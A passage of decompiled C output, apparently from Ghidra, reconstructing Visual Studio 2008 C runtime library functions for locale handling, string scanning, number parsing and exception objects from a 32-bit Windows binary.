  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtLCMapStringA_stat
                    ((localeinfo_struct *)_LocaleName,_DwMapFlag,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpDestStr,(char *)_CchDest,_Code_page,_BError,in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetStringTypeA_stat(struct localeinfo_struct *,unsigned long,char const
// *,int,unsigned short *,int,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtGetStringTypeA_stat
          (localeinfo_struct *param_1,ulong param_2,char *param_3,int param_4,ushort *param_5,
          int param_6,int param_7,int param_8)

{
  uint _Size;
  BOOL BVar1;
  DWORD DVar2;
  uint cchWideChar;
  undefined4 *puVar3;
  int iVar4;
  ushort *puVar5;
  int *in_ECX;
  undefined4 *lpWideCharStr;
  void *_Memory;
  int *local_c;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  local_c = in_ECX;
  if (DAT_00436ad8 == 0) {
    BVar1 = GetStringTypeW(1,L"",1,(LPWORD)&local_c);
    if (BVar1 == 0) {
      DVar2 = GetLastError();
      if (DVar2 == 0x78) {
        DAT_00436ad8 = 2;
      }
      goto LAB_004244fa;
    }
    DAT_00436ad8 = 1;
  }
  else {
LAB_004244fa:
    if ((DAT_00436ad8 == 2) || (DAT_00436ad8 == 0)) {
      _Memory = (void *)0x0;
      if (param_6 == 0) {
        param_6 = *(int *)(*in_ECX + 0x14);
      }
      if (param_5 == (ushort *)0x0) {
        param_5 = *(ushort **)(*in_ECX + 4);
      }
      puVar5 = (ushort *)___ansicp(param_6);
      if ((puVar5 != (ushort *)0xffffffff) &&
         (((puVar5 == param_5 ||
           (_Memory = (void *)___convertcp((UINT)param_5,(UINT)puVar5,(char *)param_2,
                                           (uint *)&param_3,(LPSTR)0x0,0), param_2 = (ulong)_Memory,
           _Memory != (void *)0x0)) &&
          (GetStringTypeA(param_6,(DWORD)param_1,(LPCSTR)param_2,(int)param_3,(LPWORD)param_4),
          _Memory != (void *)0x0)))) {
        _free(_Memory);
      }
      goto LAB_00424647;
    }
    if (DAT_00436ad8 != 1) goto LAB_00424647;
  }
  local_c = (int *)0x0;
  if (param_5 == (ushort *)0x0) {
    param_5 = *(ushort **)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar((UINT)param_5,(uint)(param_7 != 0) * 8 + 1,(LPCSTR)param_2,
                                    (int)param_3,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_00424647;
  lpWideCharStr = (undefined4 *)0x0;
  if ((0 < (int)cchWideChar) && (cchWideChar < 0x7ffffff1)) {
    _Size = cchWideChar * 2 + 8;
    if (_Size < 0x401) {
      puVar3 = (undefined4 *)&stack0xffffffe8;
      lpWideCharStr = (undefined4 *)&stack0xffffffe8;
      if (&stack0x00000000 != (undefined *)0x18) {
LAB_0042458a:
        lpWideCharStr = puVar3 + 2;
      }
    }
    else {
      puVar3 = (undefined4 *)_malloc(_Size);
      lpWideCharStr = puVar3;
      if (puVar3 != (undefined4 *)0x0) {
        *puVar3 = 0xdddd;
        goto LAB_0042458a;
      }
    }
  }
  if (lpWideCharStr != (undefined4 *)0x0) {
    _memset(lpWideCharStr,0,cchWideChar * 2);
    iVar4 = MultiByteToWideChar((UINT)param_5,1,(LPCSTR)param_2,(int)param_3,(LPWSTR)lpWideCharStr,
                                cchWideChar);
    if (iVar4 != 0) {
      local_c = (int *)GetStringTypeW((DWORD)param_1,(LPCWSTR)lpWideCharStr,iVar4,(LPWORD)param_4);
    }
    __freea(lpWideCharStr);
  }
LAB_00424647:
  iVar4 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar4;
}



// Library Function - Single Match
//  ___crtGetStringTypeA
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl
___crtGetStringTypeA
          (_locale_t _Plocinfo,DWORD _DWInfoType,LPCSTR _LpSrcStr,int _CchSrc,LPWORD _LpCharType,
          int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_00000020;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtGetStringTypeA_stat
                    ((localeinfo_struct *)_DWInfoType,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpCharType,(ushort *)_Code_page,_BError,in_stack_00000020,
                     in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  ___free_lc_time
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lc_time(void **param_1)

{
  if (param_1 != (void **)0x0) {
    _free(param_1[1]);
    _free(param_1[2]);
    _free(param_1[3]);
    _free(param_1[4]);
    _free(param_1[5]);
    _free(param_1[6]);
    _free(*param_1);
    _free(param_1[8]);
    _free(param_1[9]);
    _free(param_1[10]);
    _free(param_1[0xb]);
    _free(param_1[0xc]);
    _free(param_1[0xd]);
    _free(param_1[7]);
    _free(param_1[0xe]);
    _free(param_1[0xf]);
    _free(param_1[0x10]);
    _free(param_1[0x11]);
    _free(param_1[0x12]);
    _free(param_1[0x13]);
    _free(param_1[0x14]);
    _free(param_1[0x15]);
    _free(param_1[0x16]);
    _free(param_1[0x17]);
    _free(param_1[0x18]);
    _free(param_1[0x19]);
    _free(param_1[0x1a]);
    _free(param_1[0x1b]);
    _free(param_1[0x1c]);
    _free(param_1[0x1d]);
    _free(param_1[0x1e]);
    _free(param_1[0x1f]);
    _free(param_1[0x20]);
    _free(param_1[0x21]);
    _free(param_1[0x22]);
    _free(param_1[0x23]);
    _free(param_1[0x24]);
    _free(param_1[0x25]);
    _free(param_1[0x26]);
    _free(param_1[0x27]);
    _free(param_1[0x28]);
    _free(param_1[0x29]);
    _free(param_1[0x2a]);
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_num
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lconv_num(void **param_1)

{
  if (param_1 != (void **)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_00433c28) {
      _free(*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_00433c2c) {
      _free(param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_00433c30) {
      _free(param_1[2]);
    }
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_mon
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lconv_mon(int param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0xc) != PTR_DAT_00433c34) {
      _free(*(undefined **)(param_1 + 0xc));
    }
    if (*(undefined **)(param_1 + 0x10) != PTR_DAT_00433c38) {
      _free(*(undefined **)(param_1 + 0x10));
    }
    if (*(undefined **)(param_1 + 0x14) != PTR_DAT_00433c3c) {
      _free(*(undefined **)(param_1 + 0x14));
    }
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_00433c40) {
      _free(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x1c) != PTR_DAT_00433c44) {
      _free(*(undefined **)(param_1 + 0x1c));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_00433c48) {
      _free(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x24) != PTR_DAT_00433c4c) {
      _free(*(undefined **)(param_1 + 0x24));
    }
  }
  return;
}



// Library Function - Single Match
//  _strcspn
// 
// Library: Visual Studio

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  size_t sVar3;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  sVar3 = 0xffffffff;
  do {
    sVar3 = sVar3 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar3;
    }
    _Str = (char *)((byte *)_Str + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return sVar3;
}



// Library Function - Single Match
//  _strpbrk
// 
// Library: Visual Studio

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = (byte *)_Str;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (char *)(uint)bVar1;
    }
    _Str = (char *)(pbVar2 + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(char *)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return (char *)pbVar2;
}



// Library Function - Single Match
//  ___crtGetStringTypeW
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl
___crtGetStringTypeW
          (localeinfo_struct *param_1,DWORD param_2,LPCWSTR param_3,int param_4,LPWORD param_5)

{
  BOOL BVar1;
  _LocaleUpdate local_14 [8];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,param_1);
  if (param_4 < -1) {
    BVar1 = 0;
  }
  else {
    BVar1 = GetStringTypeW(param_2,param_3,param_4,param_5);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return BVar1;
}



// Library Function - Single Match
//  __fputwc_nolock
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __fputwc_nolock(wchar_t _Ch,FILE *_File)

{
  int *piVar1;
  wint_t wVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  errno_t eVar6;
  int local_14;
  char local_10 [8];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    iVar3 = __fileno(_File);
    if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
      puVar5 = &DAT_00433150;
    }
    else {
      iVar3 = __fileno(_File);
      uVar4 = __fileno(_File);
      puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00437d80)[iVar3 >> 5]);
    }
    if ((puVar5[0x24] & 0x7f) != 2) {
      iVar3 = __fileno(_File);
      if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
        puVar5 = &DAT_00433150;
      }
      else {
        iVar3 = __fileno(_File);
        uVar4 = __fileno(_File);
        puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00437d80)[iVar3 >> 5]);
      }
      if ((puVar5[0x24] & 0x7f) != 1) {
        iVar3 = __fileno(_File);
        if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
          puVar5 = &DAT_00433150;
        }
        else {
          iVar3 = __fileno(_File);
          uVar4 = __fileno(_File);
          puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00437d80)[iVar3 >> 5]);
        }
        if ((puVar5[4] & 0x80) != 0) {
          eVar6 = _wctomb_s(&local_14,local_10,5,_Ch);
          if ((eVar6 == 0) && (iVar3 = 0, 0 < local_14)) {
            do {
              piVar1 = &_File->_cnt;
              *piVar1 = *piVar1 + -1;
              if (*piVar1 < 0) {
                uVar4 = __flsbuf((int)local_10[iVar3],_File);
              }
              else {
                *_File->_ptr = local_10[iVar3];
                uVar4 = (uint)(byte)*_File->_ptr;
                _File->_ptr = _File->_ptr + 1;
              }
            } while ((uVar4 != 0xffffffff) && (iVar3 = iVar3 + 1, iVar3 < local_14));
          }
          goto LAB_00424b56;
        }
      }
    }
  }
  piVar1 = &_File->_cnt;
  *piVar1 = *piVar1 + -2;
  if (*piVar1 < 0) {
    __flswbuf((uint)(ushort)_Ch,_File);
  }
  else {
    *(wchar_t *)_File->_ptr = _Ch;
    _File->_ptr = _File->_ptr + 2;
  }
LAB_00424b56:
  wVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar2;
}



// Library Function - Single Match
//  unsigned long __cdecl strtoxl(struct localeinfo_struct *,char const *,char const * *,int,int)
// 
// Library: Visual Studio 2008 Release

ulong __cdecl
strtoxl(localeinfo_struct *param_1,char *param_2,char **param_3,int param_4,int param_5)

{
  ushort uVar1;
  byte *pbVar2;
  int *piVar3;
  uint uVar4;
  pthreadlocinfo ptVar5;
  uint uVar6;
  int iVar7;
  byte bVar8;
  byte *pbVar9;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ulong local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,param_1);
  if (param_3 != (char **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (char *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  bVar8 = *param_2;
  local_8 = 0;
  ptVar5 = local_18.locinfo;
  pbVar2 = (byte *)param_2;
  while( true ) {
    pbVar9 = pbVar2 + 1;
    if ((int)ptVar5->locale_name[3] < 2) {
      uVar4 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2) & 8;
    }
    else {
      uVar4 = __isctype_l((uint)bVar8,8,&local_18);
      ptVar5 = local_18.locinfo;
    }
    if (uVar4 == 0) break;
    bVar8 = *pbVar9;
    pbVar2 = pbVar9;
  }
  if (bVar8 == 0x2d) {
    param_5 = param_5 | 2;
LAB_00424c1e:
    bVar8 = *pbVar9;
    pbVar9 = pbVar2 + 2;
  }
  else if (bVar8 == 0x2b) goto LAB_00424c1e;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (char **)0x0) {
      *param_3 = param_2;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if (param_4 == 0) {
    if (bVar8 != 0x30) {
      param_4 = 10;
      goto LAB_00424c84;
    }
    if ((*pbVar9 != 0x78) && (*pbVar9 != 0x58)) {
      param_4 = 8;
      goto LAB_00424c84;
    }
    param_4 = 0x10;
  }
  else if ((param_4 != 0x10) || (bVar8 != 0x30)) goto LAB_00424c84;
  if ((*pbVar9 == 0x78) || (*pbVar9 == 0x58)) {
    bVar8 = pbVar9[1];
    pbVar9 = pbVar9 + 2;
  }
LAB_00424c84:
  uVar4 = (uint)(0xffffffff / (ulonglong)(uint)param_4);
  do {
    uVar1 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2);
    if ((uVar1 & 4) == 0) {
      if ((uVar1 & 0x103) == 0) {
LAB_00424ce1:
        pbVar9 = pbVar9 + -1;
        if ((param_5 & 8U) == 0) {
          if (param_3 != (char **)0x0) {
            pbVar9 = (byte *)param_2;
          }
          local_8 = 0;
        }
        else if (((param_5 & 4U) != 0) ||
                (((param_5 & 1U) == 0 &&
                 ((((param_5 & 2U) != 0 && (0x80000000 < local_8)) ||
                  (((param_5 & 2U) == 0 && (0x7fffffff < local_8)))))))) {
          piVar3 = __errno();
          *piVar3 = 0x22;
          if ((param_5 & 1U) == 0) {
            local_8 = ((param_5 & 2U) != 0) + 0x7fffffff;
          }
          else {
            local_8 = 0xffffffff;
          }
        }
        if (param_3 != (char **)0x0) {
          *param_3 = (char *)pbVar9;
        }
        if ((param_5 & 2U) != 0) {
          local_8 = -local_8;
        }
        if (local_c == '\0') {
          return local_8;
        }
        *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
        return local_8;
      }
      iVar7 = (int)(char)bVar8;
      if ((byte)(bVar8 + 0x9f) < 0x1a) {
        iVar7 = iVar7 + -0x20;
      }
      uVar6 = iVar7 - 0x37;
    }
    else {
      uVar6 = (int)(char)bVar8 - 0x30;
    }
    if ((uint)param_4 <= uVar6) goto LAB_00424ce1;
    if ((local_8 < uVar4) ||
       ((local_8 == uVar4 && (uVar6 <= (uint)(0xffffffff % (ulonglong)(uint)param_4))))) {
      local_8 = local_8 * param_4 + uVar6;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (char **)0x0) goto LAB_00424ce1;
    }
    bVar8 = *pbVar9;
    pbVar9 = pbVar9 + 1;
  } while( true );
}



// Library Function - Single Match
//  _strtol
// 
// Library: Visual Studio 2008 Release

long __cdecl _strtol(char *_Str,char **_EndPtr,int _Radix)

{
  ulong uVar1;
  undefined **ppuVar2;
  
  if (DAT_00436790 == 0) {
    ppuVar2 = &PTR_DAT_00433988;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  uVar1 = strtoxl((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return uVar1;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &)
// 
// Library: Visual Studio 2008 Release

exception * __thiscall std::exception::exception(exception *this,char **param_1)

{
  size_t sVar1;
  char *_Dst;
  
  *(undefined ***)this = vftable;
  if (*param_1 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar1 = _strlen(*param_1);
    _Dst = (char *)_malloc(sVar1 + 1);
    *(char **)(this + 4) = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,sVar1 + 1,*param_1);
    }
  }
  *(undefined4 *)(this + 8) = 1;
  return this;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Library: Visual Studio 2008 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  int iVar1;
  size_t sVar2;
  char *pcVar3;
  
  *(undefined ***)this = vftable;
  iVar1 = *(int *)(param_1 + 8);
  *(int *)(this + 8) = iVar1;
  pcVar3 = *(char **)(param_1 + 4);
  if (iVar1 == 0) {
    *(char **)(this + 4) = pcVar3;
  }
  else if (pcVar3 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar2 = _strlen(pcVar3);
    pcVar3 = (char *)_malloc(sVar2 + 1);
    *(char **)(this + 4) = pcVar3;
    if (pcVar3 != (char *)0x0) {
      _strcpy_s(pcVar3,sVar2 + 1,*(char **)(param_1 + 4));
    }
  }
  return this;
}



// Library Function - Single Match
//  public: virtual __thiscall exception::~exception(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall exception::~exception(exception *this)

{
  *(undefined ***)this = std::exception::vftable;
  if (*(int *)(this + 8) != 0) {
    _free(*(void **)(this + 4));
  }
  return;
}



char * __fastcall FUN_00424e85(int param_1)

{
  char *pcVar1;
  
  pcVar1 = *(char **)(param_1 + 4);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "Unknown exception";
  }
  return pcVar1;
}



exception * __thiscall FUN_00424e92(void *this,byte param_1)

{
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (exception *)this;
}



// Library Function - Single Match
//  int __cdecl _ValidateRead(void const *,unsigned int)
// 
// Library: Visual Studio 2008 Release

int __cdecl _ValidateRead(void *param_1,uint param_2)

{
  return (uint)(param_1 != (void *)0x0);
}



// Library Function - Single Match
//  __isdigit_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __isdigit_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 4;
  }
  else {
    uVar1 = __isctype_l(_C,4,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  _isdigit
// 
// Library: Visual Studio 2008 Release

int __cdecl _isdigit(int _C)

{
  int iVar1;
  
  if (DAT_00436790 == 0) {
    return *(ushort *)(PTR_DAT_00433970 + _C * 2) & 4;
  }
  iVar1 = __isdigit_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __tolower_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  CHAR CVar5;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  byte local_c;
  undefined local_b;
  CHAR local_8;
  CHAR local_7;
  undefined local_6;
  
  iVar1 = _C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if ((uint)_C < 0x100) {
    if ((int)(local_1c.locinfo)->locale_name[3] < 2) {
      uVar2 = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2) & 1;
    }
    else {
      uVar2 = __isctype_l(_C,1,&local_1c);
    }
    if (uVar2 == 0) {
LAB_00424fa5:
      if (local_10 == '\0') {
        return iVar1;
      }
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      return iVar1;
    }
    uVar2 = (uint)*(byte *)((int)local_1c.locinfo[1].lc_category[0].wlocale + _C);
  }
  else {
    CVar5 = (CHAR)_C;
    if (((int)(local_1c.locinfo)->locale_name[3] < 2) ||
       (iVar3 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c), iVar3 == 0)) {
      piVar4 = __errno();
      *piVar4 = 0x2a;
      local_7 = '\0';
      iVar3 = 1;
      local_8 = CVar5;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_8 = (CHAR)_C;
      local_6 = 0;
      iVar3 = 2;
      local_7 = CVar5;
    }
    iVar3 = ___crtLCMapStringA(&local_1c,(local_1c.locinfo)->lc_category[0].wlocale,0x100,&local_8,
                               iVar3,(LPSTR)&local_c,3,(local_1c.locinfo)->lc_codepage,1);
    if (iVar3 == 0) goto LAB_00424fa5;
    uVar2 = (uint)local_c;
    if (iVar3 != 1) {
      uVar2 = (uint)CONCAT11(local_c,local_b);
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return uVar2;
}



// Library Function - Single Match
//  _tolower
// 
// Library: Visual Studio 2008 Release

int __cdecl _tolower(int _C)

{
  if (DAT_00436790 == 0) {
    if (_C - 0x41U < 0x1a) {
      return _C + 0x20;
    }
  }
  else {
    _C = __tolower_l(_C,(_locale_t)0x0);
  }
  return _C;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  localeinfo_struct local_28;
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_28,_Locale);
  local_18 = ___strgtold12_l(&local_14,&local_2c,_Str,0,0,0,0,&local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_004250de:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0042511e;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_00425110:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0042511e;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_00425110;
    goto LAB_004250de;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_0042511e:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  localeinfo_struct local_28;
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_28,_Locale);
  local_18 = ___strgtold12_l(&local_14,&local_2c,_Str,0,0,0,0,&local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_00425186:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_004251c6;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_004251b8:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_004251c6;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_004251b8;
    goto LAB_00425186;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_004251c6:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Single Match
//  __fptostr
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __fptostr(char *_Buf,size_t _SizeInBytes,int _Digits,STRFLT _PtFlt)

{
  int *piVar1;
  int iVar2;
  char *pcVar3;
  size_t sVar4;
  char cVar5;
  char *pcVar6;
  errno_t eVar7;
  
  pcVar6 = _PtFlt->mantissa;
  if ((_Buf == (char *)0x0) || (_SizeInBytes == 0)) {
    piVar1 = __errno();
    eVar7 = 0x16;
    *piVar1 = 0x16;
  }
  else {
    *_Buf = '\0';
    iVar2 = _Digits;
    if (_Digits < 1) {
      iVar2 = 0;
    }
    if (iVar2 + 1U < _SizeInBytes) {
      *_Buf = '0';
      pcVar3 = _Buf + 1;
      if (0 < _Digits) {
        do {
          cVar5 = *pcVar6;
          if (cVar5 == '\0') {
            cVar5 = '0';
          }
          else {
            pcVar6 = pcVar6 + 1;
          }
          *pcVar3 = cVar5;
          pcVar3 = pcVar3 + 1;
          _Digits = _Digits + -1;
        } while (0 < _Digits);
      }
      *pcVar3 = '\0';
      if ((-1 < _Digits) && ('4' < *pcVar6)) {
        while (pcVar3 = pcVar3 + -1, *pcVar3 == '9') {
          *pcVar3 = '0';
        }
        *pcVar3 = *pcVar3 + '\x01';
      }
      if (*_Buf == '1') {
        _PtFlt->decpt = _PtFlt->decpt + 1;
      }
      else {
        sVar4 = _strlen(_Buf + 1);
        _memmove(_Buf,_Buf + 1,sVar4 + 1);
      }
      return 0;
    }
    piVar1 = __errno();
    eVar7 = 0x22;
    *piVar1 = 0x22;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar7;
}



// Library Function - Single Match
//  ___dtold
// 
// Library: Visual Studio 2008 Release

void __cdecl ___dtold(uint *param_1,uint *param_2)

{
  uint uVar1;
  ushort uVar2;
  ushort uVar3;
  ushort uVar4;
  uint local_8;
  
  uVar2 = *(ushort *)((int)param_2 + 6) >> 4;
  uVar4 = *(ushort *)((int)param_2 + 6) & 0x8000;
  uVar3 = uVar2 & 0x7ff;
  uVar1 = *param_2;
  local_8 = 0x80000000;
  if ((uVar2 & 0x7ff) == 0) {
    if (((param_2[1] & 0xfffff) == 0) && (uVar1 == 0)) {
      param_1[1] = 0;
      *param_1 = 0;
      goto LAB_00425348;
    }
